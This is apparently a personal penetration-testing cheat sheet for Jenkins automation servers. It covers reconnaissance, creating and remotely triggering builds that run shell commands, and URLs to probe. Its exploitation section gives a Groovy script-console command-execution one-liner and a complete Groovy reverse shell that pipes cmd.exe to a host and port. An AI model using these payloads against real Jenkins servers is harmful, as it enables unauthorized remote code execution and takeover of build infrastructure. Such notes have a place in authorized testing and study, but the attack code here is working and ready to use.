# What is Jenkins

* Jenkins is an open source automation server for CICD pipeline
* It is written in Java
* some reading stuff https://www.toolsqa.com/jenkins/jenkins-user-management/

# Recon

* Version number is at the footer
* People > Username > Configure > API tokens 
* visit /manage page

# Triggering Malicious builds

## Entry Point

* create job 
* Build > execute Windows batch command / execute shell


## Trigger

* Using schedule
* using API token
Select `Trigger builds remotely (e.g., from scripts)`

Generate token `user -> configure -> Add new toke name to configuration`

`http://[username]:[user_password]@[host]/job/[job name]/build?token=[token name]`


# Exploitation

## Things to look for


### Tools
 https://github.com/gquere/pwn_jenkins
 https://github.com/Accenture/jenkins-attack-framework

### URL's to check
JENKINSIP/PROJECT//securityRealm/user/admin
JENKINSIP/jenkins/script

### Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";

### Groovy RevShell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

